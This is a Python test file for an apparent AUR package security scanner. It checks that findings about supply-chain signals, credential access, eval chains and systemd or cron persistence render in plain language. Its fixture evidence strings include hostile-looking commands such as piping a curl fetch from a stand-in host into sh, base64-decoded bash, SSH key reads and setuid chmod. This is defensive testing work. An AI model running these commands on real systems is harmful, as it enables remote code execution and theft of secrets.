import json

from aurascan.core.models import (
    Confidence,
    EvidenceQuality,
    Finding,
    PackageMetadata,
    Phase,
    ScanReport,
    Severity,
    Source,
)
from aurascan.core.risk import RiskEngine


def make_finding(rule_id, severity=Severity.MEDIUM, source=Source.history_analyzer, evidence="detail"):
    return Finding(
        rule_id=rule_id,
        package_name="pkg",
        package_version="1",
        phase=Phase.history_diff if rule_id.startswith("HIST-") else Phase.pkgbuild_static,
        source=source,
        severity=severity,
        confidence=Confidence.CONFIRMED,
        evidence_quality=EvidenceQuality.confirmed_history_diff if rule_id.startswith("HIST-") else EvidenceQuality.confirmed_static_pattern,
        file_path="PKGBUILD",
        explanation=f"{rule_id} explanation",
        recommendation="review",
        blocks_installation=severity == Severity.CRITICAL,
        requires_manual_review=severity != Severity.LOW,
        evidence_snippet=evidence,
    )


def render(findings, verbose=False):
    report = ScanReport(PackageMetadata("pkg", "1"), findings)
    report.risk_summary = RiskEngine().evaluate(findings)
    return report.render_terminal(use_color=False, verbose=verbose)


def test_maintainer_changed_template_uses_plain_language():
    output = render([make_finding("HIST-MAINTAINER-CHANGED", evidence="Alice -> Bob")])

    assert "Package maintainer changed." in output
    assert "different AUR account" in output
    assert "HIST-MAINTAINER-CHANGED" not in output


def test_source_host_changed_template_uses_plain_language():
    output = render([make_finding("HIST-SOURCE-HOST-CHANGED")])

    assert "Package source changed location." in output
    assert "used to download source code from one host" in output


def test_validpgpkeys_removed_template_uses_plain_language():
    output = render([make_finding("HIST-PGP-REMOVED", Severity.HIGH)])

    assert "Source signature verification was removed." in output
    assert "weakens integrity protection" in output


def test_dependency_added_template_uses_plain_language():
    output = render([make_finding("HIST-DEPENDS-ADDED")])

    assert "New dependency added." in output
    assert "expand the trust chain" in output


def test_install_added_template_uses_plain_language():
    output = render([make_finding("HIST-INSTALL-ADDED", Severity.HIGH)])

    assert "Package install script added." in output
    assert "run during installation" in output


def test_build_function_changed_template_uses_plain_language():
    output = render([make_finding("HIST-BUILD-CHANGED")])

    assert "Package build steps changed." in output
    assert "build instructions changed" in output


def test_combined_warning_for_maintainer_and_source_host_change_appears_first():
    output = render([
        make_finding("HIST-MAINTAINER-CHANGED"),
        make_finding("HIST-SOURCE-HOST-CHANGED"),
    ], verbose=True)

    combined = output.index("Package update has multiple supply-chain risk signals.")
    individual = output.index("Package maintainer changed.")
    assert combined < individual


def test_combined_warning_for_maintainer_and_pgp_removed():
    output = render([
        make_finding("HIST-MAINTAINER-CHANGED"),
        make_finding("HIST-PGP-REMOVED", Severity.HIGH),
    ])

    assert "Package update has multiple supply-chain risk signals." in output
    assert "Source signature verification was removed." in output


def test_combined_warning_for_orphan_adoption_and_source_url_changed():
    output = render([
        make_finding("HIST-ORPHAN-ADOPTED"),
        make_finding("HIST-SOURCE-URL-CHANGED"),
    ])

    assert "Package update has multiple supply-chain risk signals." in output


def test_low_level_duplicate_history_findings_are_hidden_when_combined():
    output = render([
        make_finding("HIST-MAINTAINER-CHANGED"),
        make_finding("HIST-SOURCE-HOST-CHANGED"),
        make_finding("HIST-SOURCE-URL-CHANGED"),
    ])

    assert "lower-risk" in output


def test_high_and_critical_findings_are_not_hidden():
    output = render([
        make_finding("HIST-MAINTAINER-CHANGED"),
        make_finding("HIST-PGP-REMOVED", Severity.HIGH),
        make_finding("CRED-SSH-001", Severity.CRITICAL, Source.deterministic_rule, "cat ~/.ssh/id_example"),
    ])

    assert "Source signature verification was removed." in output
    assert "Package tries to access user secrets." in output


def test_default_terminal_output_hides_raw_rule_ids():
    output = render([
        make_finding("HIST-MAINTAINER-CHANGED"),
        make_finding("HIST-SOURCE-HOST-CHANGED"),
    ])

    assert "HIST-MAINTAINER-CHANGED" not in output
    assert "history_analyzer" not in output


def test_unknown_high_finding_uses_friendly_fallback_and_is_visible():
    output = render([make_finding("EXPERIMENTAL-HIGH-RULE", Severity.HIGH, Source.deterministic_rule, "technical evidence")])

    assert "Potential high-risk package behavior found." in output
    assert "AuraScan found behavior that may be risky and needs review." in output
    assert "there is no specialized explanation template" in output
    assert "Review the evidence before installing" in output
    assert "EXPERIMENTAL-HIGH-RULE" not in output


def test_unknown_low_finding_is_hidden_by_default_but_visible_verbose():
    finding = make_finding("EXPERIMENTAL-LOW-RULE", Severity.LOW, Source.deterministic_rule, "low evidence")

    default_output = render([finding])
    verbose_output = render([finding], verbose=True)

    assert "Package note may need review." not in default_output
    assert "1 lower-risk note hidden. Use --verbose to show them." in default_output
    assert "Package note may need review." in verbose_output
    assert "EXPERIMENTAL-LOW-RULE" in verbose_output


def test_verbose_output_shows_rule_ids_and_technical_details():
    output = render([make_finding("HIST-MAINTAINER-CHANGED", evidence="Alice -> Bob")], verbose=True)

    assert "HIST-MAINTAINER-CHANGED" in output
    assert "Alice -> Bob" in output
    assert "Technical details:" in output


def test_json_output_still_preserves_rule_ids_and_technical_fields():
    findings = [make_finding("HIST-MAINTAINER-CHANGED", evidence="Alice -> Bob")]
    report = ScanReport(PackageMetadata("pkg", "1"), findings)
    report.risk_summary = RiskEngine().evaluate(findings)

    data = json.loads(report.to_json())

    assert data["findings"][0]["rule_id"] == "HIST-MAINTAINER-CHANGED"
    assert data["findings"][0]["evidence_snippet"] == "Alice -> Bob"


def test_checksum_mismatch_template_is_plain_language_and_uncertainty_aware():
    finding = make_finding("SOURCE-CHECKSUM-MISMATCH", Severity.CRITICAL, Source.deterministic_rule, "expected abc got def")
    output = render([finding])

    assert "Downloaded source does not match the expected checksum." in output
    assert "AuraScan hashed the downloaded file" in output
    assert "does not prove malicious intent" in output
    assert "SOURCE-CHECKSUM-MISMATCH" not in output


def test_invalid_signature_template_describes_check_without_overclaiming():
    finding = make_finding("SIGNATURE-INVALID", Severity.CRITICAL, Source.deterministic_rule, "bad signature")
    output = render([finding])

    assert "Source signature verification failed." in output
    assert "isolated temporary GPG environment" in output
    assert "does not prove malicious intent" in output
    assert "confirmed malware" not in output.lower()


def test_medium_source_and_signature_templates_use_plain_language():
    cases = {
        "ARCHIVE-UNSUPPORTED": "Source archive format is not supported.",
        "SIGNATURE-MISSING": "Signing key declared, but no signature was found.",
        "SIGNATURE-VERIFICATION-UNAVAILABLE": "Signature verification is unavailable.",
        "SOURCE-CHECKSUM-MISSING": "Source checksum is missing.",
        "SOURCE-GIT-TAG": "Git source uses a tag.",
        "SOURCE-GIT-UNAVAILABLE": "Git is unavailable for source acquisition.",
        "SOURCE-LOCAL-MISSING": "Declared local source is missing.",
        "SOURCE-SIGNATURE-WITHOUT-VALIDPGPKEYS": "Signature found, but expected signing key is not declared.",
        "SOURCE-UNSUPPORTED": "Source type is not supported for automatic acquisition.",
        "SOURCE-VALIDPGPKEY-WEAK": "Signing key identifier is too short.",
        "KEY_UNAVAILABLE": "Signing key could not be found.",
    }

    for rule_id, title in cases.items():
        output = render([make_finding(rule_id, Severity.MEDIUM, Source.deterministic_rule, "detail")])

        assert title in output
        assert "What AuraScan checked:" in output
        assert rule_id not in output


def test_archive_escape_template_describes_safe_archive_check():
    finding = make_finding("ARCHIVE-PATH-TRAVERSAL", Severity.CRITICAL, Source.deterministic_rule, "../evil")
    output = render([finding])

    assert "Source archive contains unsafe paths." in output
    assert "inspected archive entry names before extraction" in output
    assert "not safe to extract automatically" in output
    assert "ARCHIVE-PATH-TRAVERSAL" not in output


def test_verbose_template_output_keeps_raw_rule_ids():
    finding = make_finding("SOURCE-CHECKSUM-MISMATCH", Severity.CRITICAL, Source.deterministic_rule, "expected abc got def")
    output = render([finding], verbose=True)

    assert "SOURCE-CHECKSUM-MISMATCH" in output
    assert "expected abc got def" in output


def test_clamav_hit_has_human_friendly_wording():
    output = render([make_finding("CLAMAV-Test-Signature", Severity.CRITICAL, Source.clamav, "bad: Test FOUND")])

    assert "Known malware signature detected." in output
    assert "matched this file against a known malware signature" in output
    assert "Critical blockers:" in output


def test_credential_access_has_human_friendly_wording():
    output = render([make_finding("CRED-SSH-001", Severity.CRITICAL, Source.deterministic_rule, "cat ~/.ssh/id_example")])

    assert "Package tries to access user secrets." in output
    assert "Packages should not normally read your SSH keys" in output


def test_eval_chain_template_uses_plain_language():
    output = render([make_finding("EXEC-EVAL-001", Severity.HIGH, Source.deterministic_rule, 'eval "$cmd"')])

    assert "Package uses dynamic shell execution." in output
    assert "uses eval or similar dynamic execution" in output
    assert "does not prove the package is malicious" in output
    assert "EXEC-EVAL-001" not in output


def test_eval_network_combo_template_is_blocker_aware():
    output = render([make_finding("EXEC-EVAL-NET-001", Severity.CRITICAL, Source.deterministic_rule, "eval $(curl https://example.invalid/x)")])

    assert "combined with a network fetch" in output
    assert "block automatic installation" in output
    assert "EXEC-EVAL-NET-001" not in output


def test_systemd_persistence_template_uses_plain_language():
    output = render([make_finding("SYS-SYSTEMD-AUTO-001", Severity.HIGH, Source.deterministic_rule, "systemctl enable demo.service")])

    assert "Package may enable a system service." in output
    assert "automatically enabling or starting services" in output
    assert "SYS-SYSTEMD-AUTO-001" not in output


def test_systemd_unit_template_is_lower_risk_note():
    output = render([make_finding("SYS-SYSTEMD-UNIT-001", Severity.MEDIUM, Source.deterministic_rule, "/usr/lib/systemd/system/demo.service")])

    assert "Package installs a systemd service file." in output
    assert "lower-risk notes hidden" not in output
    assert "SYS-SYSTEMD-UNIT-001" not in output


def test_deep_static_systemd_unit_template_is_calm():
    output = render([make_finding("DEEPSTATIC-SYSTEMD-UNIT-001", Severity.MEDIUM, Source.deterministic_rule, "fixture.service")])

    assert "Source includes a systemd service file." in output
    assert "not proof of persistence or malware" in output
    assert "DEEPSTATIC-SYSTEMD-UNIT-001" not in output


def test_deep_static_systemd_auto_template_uses_plain_language():
    output = render([make_finding("DEEPSTATIC-SYSTEMD-AUTO-001", Severity.HIGH, Source.deterministic_rule, "systemctl enable fixture.service")])

    assert "Source may enable a system service." in output
    assert "automatically enabling or starting services" in output
    assert "DEEPSTATIC-SYSTEMD-AUTO-001" not in output


def test_deep_static_systemd_user_template_uses_plain_language():
    output = render([make_finding("DEEPSTATIC-SYSTEMD-USER-001", Severity.HIGH, Source.deterministic_rule, "$HOME/.config/systemd/user/fixture.service")])

    assert "Source may enable a user service." in output
    assert "User services can run automatically" in output
    assert "DEEPSTATIC-SYSTEMD-USER-001" not in output


def test_cron_persistence_template_uses_plain_language():
    output = render([make_finding("SYS-CRON-REBOOT-001", Severity.HIGH, Source.deterministic_rule, "@reboot curl https://example.invalid/x")])

    assert "Package may add a scheduled background task." in output
    assert "used for persistence" in output
    assert "SYS-CRON-REBOOT-001" not in output


def test_verbose_new_rule_output_keeps_raw_rule_id():
    output = render([make_finding("SYS-CRONTAB-001", Severity.HIGH, Source.deterministic_rule, "crontab -")], verbose=True)

    assert "SYS-CRONTAB-001" in output
    assert "crontab -" in output


def test_ai_only_finding_wording_does_not_imply_confirmed_malware():
    output = render([make_finding("AI-HEURISTIC-001", Severity.HIGH, Source.ai_review, "suspicious")])

    assert "AI review found suspicious code." in output
    assert "not a confirmed malware signature" in output
    assert "confirmed malware" not in output.lower().replace("not a confirmed malware signature", "")


def test_high_critical_fallback_coverage_for_common_rules_is_minimized():
    output = render([
        make_finding("NET-EXEC-001", Severity.CRITICAL, Source.deterministic_rule, "curl https://example.invalid | sh"),
        make_finding("EXEC-B64-001", Severity.CRITICAL, Source.deterministic_rule, "base64 -d payload | bash"),
        make_finding("SYS-CHMOD-001", Severity.HIGH, Source.deterministic_rule, "chmod +s file"),
    ])

    assert "Net exec 001" not in output
    assert "Exec b64 001" not in output
    assert "Sys chmod 001" not in output
